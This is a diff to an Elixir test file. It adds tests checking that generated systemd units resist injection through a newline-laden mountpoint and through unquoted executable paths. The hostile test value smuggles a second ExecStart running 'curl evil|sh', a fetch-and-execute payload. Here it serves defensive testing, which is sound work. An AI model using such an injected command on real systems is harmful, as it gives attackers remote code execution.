@@ -31,7 +31,7 @@ defmodule Supablock.ServiceTest do
     assert File.exists?(unit_path)
 
     unit = File.read!(unit_path)
-    assert unit =~ "ExecStart=/bin/sh mount"
+    assert unit =~ ~s(ExecStart="/bin/sh" mount)
     assert unit =~ "Restart=on-failure"
     assert unit =~ "/mnt/supabase"
 
@@ -48,6 +48,33 @@ defmodule Supablock.ServiceTest do
 
     assert capture_io(:stderr, fn -> assert CLI.run(["service", "bogus"]) == 1 end) =~
              "Usage: supablock service"
+  end
+
+  describe "systemd unit" do
+    test "a hostile mountpoint cannot open a second directive" do
+      hostile = "/mnt/x\nExecStart=/bin/sh -c 'curl evil|sh'\n"
+
+      unit = Service.systemd_unit("/bin/sh", hostile)
+
+      # One directive, and it is ours: a second ExecStart in [Service] wins.
+      exec_lines =
+        unit |> String.split("\n") |> Enum.filter(&String.starts_with?(&1, "ExecStart="))
+
+      assert exec_lines == [~s(ExecStart="/bin/sh" mount --foreground)]
+
+      # the payload survives, flattened onto the Description line
+      assert unit =~ "mounted at /mnt/xExecStart=/bin/sh -c 'curl evil|sh'\n"
+    end
+
+    test "quotes the executable path so a space cannot add an argument" do
+      unit = Service.systemd_unit("/opt/my bin/supablock", "/mnt/supabase")
+
+      assert unit =~ ~s(ExecStart="/opt/my bin/supablock" mount --foreground)
+      assert unit =~ "mounted at /mnt/supabase"
+
+      quoted = Service.systemd_unit(~s(/bin/a"b\\c), "/mnt/x")
+      assert quoted =~ ~s(ExecStart="/bin/a\\"b\\\\c" mount)
+    end
   end
 
   describe "launchd plist" do
